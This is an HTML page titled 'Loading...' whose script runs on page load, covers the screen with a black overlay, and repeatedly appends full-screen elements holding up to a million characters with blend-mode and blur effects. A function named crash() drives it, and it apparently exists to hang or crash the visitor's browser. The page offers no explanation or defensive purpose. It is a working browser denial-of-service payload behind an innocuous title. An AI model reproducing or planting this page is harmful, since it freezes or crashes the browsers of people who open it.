<html>
<head><title>Loading...</title></head>
<body>
<script>
let div = document.createElement('div');
div.style.position = 'fixed';
div.style.top = '0';
div.style.left = '0';
div.style.width = '100%';
div.style.height = '100%';
div.style.background = 'black';
div.style.zIndex = '9999';
document.body.appendChild(div);

let count = 0;
let max = 100000;
let total = '';

function crash() {
    for (let i = 0; i < max; i++) {
        total += 'A';
    }
    let a = document.createElement('div');
    a.textContent = total;
    a.style.mixBlendMode = 'difference';
    a.style.filter = 'blur(0.1px)';
    a.style.position = 'fixed';
    a.style.top = '0';
    a.style.left = '0';
    a.style.width = '100%';
    a.style.height = '100%';
    div.appendChild(a);
}

for (let i = 0; i < 10; i++) {
    crash();
}
</script>
</body>
</html>
